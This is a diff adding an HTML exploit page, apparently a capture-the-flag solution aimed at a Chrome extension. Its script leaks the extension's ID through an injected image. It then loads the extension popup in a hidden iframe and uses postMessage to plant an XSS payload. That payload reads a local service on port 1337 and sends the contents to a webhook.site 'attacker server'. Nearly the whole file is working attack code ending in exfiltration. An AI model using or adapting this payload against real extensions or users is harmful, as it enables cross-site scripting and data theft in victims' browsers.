@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+</head>
+<body>
+    <h1>Exploiting...</h1>
+    <marquee id="leaker"></marquee>
+    <script>
+        const ATTACKER_SERVER = "https://webhook.site/your-id";
+
+        const observer = new MutationObserver((mutations, obs) => {
+            for (const mutation of mutations) {
+                for (const node of mutation.addedNodes) {
+                    if (node.tagName === 'IMG' && node.src && node.src.startsWith('chrome-extension://')) {
+                        const extensionUrl = new URL(node.src);
+                        const extensionId = extensionUrl.hostname;
+                        obs.disconnect();
+                        setMaliciousPayload(extensionId);
+                        return;
+                    }
+                }
+            }
+        });
+
+        observer.observe(document.body, { childList: true, subtree: true });
+
+        function setMaliciousPayload(extensionId) {
+            const iframe = document.createElement('iframe');
+            iframe.src = `chrome-extension://${extensionId}/popup.html`;
+            iframe.style.display = "none";
+            iframe.onload = () => {
+                const payload = `<img src=x onerror="fetch('http://localhost:1337').then(r=>r.text()).then(d=>{ new Image().src='${ATTACKER_SERVER}/?flag='+encodeURIComponent(d); })">`;
+                iframe.contentWindow.postMessage({ type: "SET", replacementString: payload }, '*');
+                setTimeout(() => { window.location.href = "http://localhost:1337"; }, 1500);
+            };
+            document.body.appendChild(iframe);
+        }
+    </script>
+</body>
+</html>
